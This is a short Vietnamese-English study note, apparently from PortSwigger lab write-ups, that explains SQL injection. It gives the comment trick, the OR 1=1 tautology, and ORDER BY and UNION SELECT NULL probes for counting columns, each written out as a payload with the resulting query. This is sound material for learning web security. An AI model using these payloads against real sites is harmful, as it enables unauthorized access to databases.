# Lab-portswigger Writeups
# Một câu query bình thường sẽ có kiểu như này : 
https://insecure-website.com/products?category=Gifts

--> SELECT * FROM products WHERE category = 'Gifts' AND released = 1
# một câu query tấn công 
https://insecure-website.com/products?category=Gifts'--

--> SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

khi có -- thì sql sẽ nghĩ đây là cmt thế nên chúng sẽ không áp dụng câu lệnh AND phía sau nữa 

https://insecure-website.com/products?category=Gifts'+OR+1=1--

--> SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

Truy vấn đã sửa đổi trả về tất cả các mục trong đó là category, Giftshoặc 1bằng 1. Vì 1=1luôn đúng, nên truy vấn trả về tất cả các mục

# union 

SELECT a, b FROM table1 UNION SELECT c, d FROM table2

Câu select này khi trả về sẽ trả về 2 giá trị , giá trị của a, b từ bảng 1 và c d từ bảng 2 . 

# order

' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--

etc.

The ORDER BY position number 3 is out of range of the number of items in the select list.


' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT NULL,NULL,NULL--

etc.

All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

